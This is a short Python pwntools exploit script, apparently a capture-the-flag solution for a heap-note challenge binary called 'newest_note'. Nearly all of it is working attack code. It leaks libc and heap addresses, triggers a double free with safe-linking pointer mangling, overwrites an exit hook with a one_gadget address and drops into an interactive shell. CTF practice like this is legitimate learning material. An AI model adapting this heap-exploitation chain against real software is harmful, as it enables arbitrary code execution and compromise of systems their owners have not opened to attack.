from pwn import *

elf = ELF('./newest_note')
libc = ELF('./libc.so.6')
# context(arch=elf.arch, os=elf.os, log_level = 'debug')
p = process([elf.path])

def add_chunk(index, content):
    p.sendafter(b"4. Exit\n", b"1\n")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendafter(b"Content: ", content)
    

def delete_chunk(index):
    p.sendafter(b"4. Exit\n", b"2\n")
    p.sendlineafter(b"Index: ", str(index).encode())


def show_chunk(index):
    p.sendafter(b"4. Exit\n", b"3\n")
    p.sendlineafter(b"Index: ", str(index).encode())

p.sendlineafter(b"How many pages your notebook will be? :",b'1074003968')
show_chunk(537498)
libc.address=u64(p.recvuntil(b'\x7F')[-6:].ljust(8,b'\x00'))-0x218cc0
log.info("libc.address: "+hex(libc.address))

one_gadget=libc.address+[0xeeccc,0xeeccf,0xeecd2][0]

add_chunk(0, b'aaa') #1
for i in range(1,9):
    add_chunk(i, b'aaa') #2-9
delete_chunk(0) #1
show_chunk(0)
heap_addr=u64(p.recvuntil(b'\x05')[-5:].ljust(8,b'\x00'))<<12
log.info("heap_addr: "+hex(heap_addr))

chunk_list_addr = heap_addr + 0x2a0

for i in range(1,7):
    delete_chunk(i) #2-7
delete_chunk(7)
delete_chunk(8)
delete_chunk(7) #10

for i in range(0,7):
    add_chunk(i, p64(0)+p64(0x431)) #16
exit_hook = libc.address + 0x21a6c0
# log.info("__malloc_hook: "+hex(libc.sym['__malloc_hook']))
add_chunk(7, p64(exit_hook^(heap_addr>>12)))
add_chunk(8, b'aaa')
add_chunk(7, b'/bin/sh\x00')
add_chunk(9, p64(one_gadget)*2) #chunk_list,0-5,20次add

# add_chunk(15, b'aaa')
p.sendafter(b"4. Exit\n", b"4\n")

# gdb.attach(p)
p.interactive()
